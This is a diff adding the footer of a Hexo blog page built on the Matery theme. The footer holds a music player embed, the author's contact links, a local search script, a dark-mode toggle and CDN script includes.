+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/aplayer/APlayer.min.js"></script>
+<script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">Ethe</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">231k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Ethe448" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1078240421@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1078240421" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1078240421" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+    <!-- 白天和黑夜主题 -->
+<div class="sum-moon-box">
+  <a class="btn-floating btn-large waves-effect waves-light" onclick="switchNightMode()" title="切换主题" >
+    <i id="sum-moon-icon" class="fas fa-sun" style="width:48px; height:48px; font-size: 28px;"></i>
+  </a>
+</div>
+
+<script>
+  function switchNightMode() {
+    $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+      setTimeout(function () {
+        $('body').hasClass('DarkMode') 
+        ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+        : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+          
+        setTimeout(function () {
+          $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+            $(this).remove()
+          })
+        }, 2e3)
+      })
+  }
+</script>
+
+    <script>
+    //模式判断 
+    if (localStorage.getItem('isDark') === '0') {
+        document.body.classList.add('DarkMode');
+        $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')
+    } else {
+        document.body.classList.remove('DarkMode');
+        $('#sum-moon-icon').removeleClass("fa-sun").addClass('fa-moon')
+    }
+    </script>
+
+    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/materialize/materialize.min.js"></script>
+    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/aos/aos.js"></script>
+    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    
+    <script async src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
